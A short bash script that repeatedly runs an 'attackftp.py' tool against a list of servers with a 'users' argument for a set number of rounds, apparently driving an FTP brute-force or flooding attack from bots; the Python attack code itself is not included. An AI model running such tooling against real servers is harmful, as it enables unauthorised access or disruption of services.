#!/bin/bash

#give the duration of the attack per bot
#duration=${1:-"9999999999"}

duration=${2:-60}

echo "running $duration"



server=${1:-$attack_servers}

count=0
while  ! [ true -a  $count -gt $duration ];do 
	
	for ip in $server;do
		python attackftp.py -t $server -p users
		sleep 1
		echo " "
		echo "Attacking server $ip"
		echo "$count NTH TIME"
		echo "################################"
	    echo " "
	done
	count=$(($count + 1))
done



